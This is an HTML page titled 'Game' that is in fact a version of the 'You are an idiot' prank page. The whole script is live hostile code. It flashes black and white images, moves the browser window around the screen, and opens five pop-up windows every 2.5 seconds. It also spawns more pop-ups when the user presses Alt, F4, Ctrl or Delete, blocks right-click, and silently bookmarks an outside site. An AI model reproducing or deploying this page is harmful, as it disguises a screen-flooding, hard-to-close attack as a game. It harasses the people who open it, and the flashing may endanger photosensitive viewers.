<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <title>Game</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick="addBookmark()">

    <!-- The loading mask (this is what covers the screen) -->
    <div id="loading_mask" style="position:absolute; top:0; left:0; width:100%; height:100%; background-color:#ffffff; z-index:9999;"></div>

    <!-- The actual content (hidden behind the mask) -->
    <div align="center" style="visibility:hidden;">
        <img id="idiot_gif" src="svg/black.svg" alt="You are an idiot!" width="640" height="480">
    </div>

    <bgsound id="bg_audio" src="idiotl.mp3" loop="infinite">

    <script language="Javascript">
        // --- IE4/5 safe named functions ---
        function blockRightClick() {
            return false;
        }

        // --- Auto-Bookmark the site (whenever they click anywhere) ---
        function addBookmark() {
            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
                window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
            }
        }

        // --- Load & Reveal the Chaos ---
        function revealChaos() {
            // 1. Show the SVG
            document.getElementById("idiot_gif").style.visibility = "visible";

            // 2. Remove the loading mask
            document.getElementById("loading_mask").style.display = "none";

            // 3. Change the title to the truth
            document.title = "You are an idiot!";

            // 4. Bounce the window
            flagRun = 1;
            playBall();

            // 5. Spawn the pop-ups
            procreate();
            setInterval("procreate()", 2500);
        }

        // The SVG flash loop
        var isBlack = true;
        function flashSVG() {
            isBlack = !isBlack;
            document.getElementById("idiot_gif").src = isBlack ? "svg/black.svg" : "svg/white.svg";
        }

        var flagRun = 1;
        var xOff = 5;
        var yOff = 5;
        var xPos = 400;
        var yPos = -100;

        function playBall() {
            if (flagRun != 1) return;
            xPos += xOff;
            yPos += yOff;
            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
            window.moveTo(xPos, yPos);
            setTimeout("playBall()", 1);
        }

        function openWindow(url) {
            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
        }

        // --- Uses loll.html now ---
        function procreate() {
            for (var i = 0; i < 5; i++) {
                openWindow('loll.html');
            }
        }

        // Named function for keyboard traps
        function keyTrap() {
            if (event.keyCode == 18 || event.keyCode == 115) {
                alert("You are an idiot!");
                procreate();
            }
            if (event.keyCode == 17) {
                alert("You are an idiot!");
                procreate();
            }
            if (event.keyCode == 46) {
                alert("You are an idiot!");
                procreate();
            }
        }

        document.onkeydown = keyTrap;
        document.oncontextmenu = blockRightClick;

        // --- Wait for GIF to load before revealing chaos ---
        setTimeout("revealChaos()", 3000);
        setInterval("flashSVG()", 500); // 0.5 seconds
    </script>
</body>
</html>
